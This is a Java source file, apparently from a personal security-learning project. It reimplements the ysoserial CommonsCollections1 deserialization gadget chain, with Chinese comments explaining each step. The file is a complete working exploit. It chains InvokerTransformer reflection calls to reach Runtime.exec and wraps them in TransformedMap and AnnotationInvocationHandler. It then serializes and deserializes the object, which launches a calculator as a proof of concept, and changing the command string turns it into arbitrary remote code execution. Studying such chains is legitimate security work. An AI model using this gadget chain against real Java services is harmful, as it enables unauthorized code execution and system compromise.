package com.xjjlearning.hack.java.ysoserial.payloads;

import com.xjjlearning.hack.java.ysoserial.payloads.util.SerializationUtil;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.IOException;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;
import java.util.Optional;

/**
 * created by xjj on 2023/1/27
 */
public class CommonCollections1 {

    // 使用jdk8u66执行
    public void gadget() throws ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException, IOException {

        Transformer[] transformers = new Transformer[]{
                // runtime接口没有实现java.io.Serializable所以要继续使用反射, 因为Class类实现了Serializable
                // 这样序列化的时候我们序列化的就不是Runtime类了
                // new ConstantTransformer(Runtime.getRuntime()),

                // 构造反射参考如下, 并使用Transformer的子类完成
                // Class<?> clazz = Class.forName("java.lang.Runtime");
                // Method method = clazz.getMethod("getRuntime");
                // Runtime runtime = (Runtime) method.invoke(null);
                // clazz.getMethod("exec", String.class).invoke(runtime, command);

                new ConstantTransformer(Runtime.class),
                // 执行的函数名, 类型, 值
                // 执行Runtime类的 getMethod 方法, 传入的值类型是(String, Class<?>...), 值是getRuntime, Class[0]
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}
                ),
                // 执行Method类的invoke方法, 传入的值类型是(Object, Object...), 值是null, Object[0]
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}
                ),
                // 执行Runtime类的exec方法, 传入的值的类型是String, 值如下"open -a Calculator"
                new InvokerTransformer("exec",
                        new Class[]{String.class}, new Object[]{"open -a Calculator"}
                )
        };
        ChainedTransformer transformerChain = new ChainedTransformer(transformers);

        HashMap innerMap = new HashMap();
        // 这个是因为 AnnotationInvocationHandler.java 需要, key为value (445行 -> String name = memberValue.getKey();
        // 那个是根据函数的名称拿到返回类型的Class
        innerMap.put("value", "xxxx");

        // 注意这里的类型 TransformedMap TransformedMap.decorate(map, keyTransformer, valueTransformer)

        // 如下三种写法皆可, 都填入将触发两次执行, 修改加入序列化后只能执行第一个, 因为只传入到了 valueTransformer
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        // Map outerMap = TransformedMap.decorate(innerMap, transformerChain, null);
        // Map outerMap = TransformedMap.decorate(innerMap, transformerChain, transformerChain);

        // put元素的时候实现transfer包装, 进而执行我们的恶意代码
        // 我们需要执行TransformedMap中的 transformKey() 或者 transformValue()
        // outerMap.put("test", "xxx");

        // jdk8u71之前的 AnnotationInvocationHandler
        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        // Annotation的子类有 Retention, Target, Documented等等 是所有注解类的公共接口
        Object obj = constructor.newInstance(Retention.class, outerMap);

        // 序列化并反序列化
        Optional<byte[]> b = SerializationUtil.serialize(obj);
        SerializationUtil.deserialize(b);
    }


    public static void main(String[] args) throws ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException, IOException {
        new CommonCollections1().gadget();
    }
}
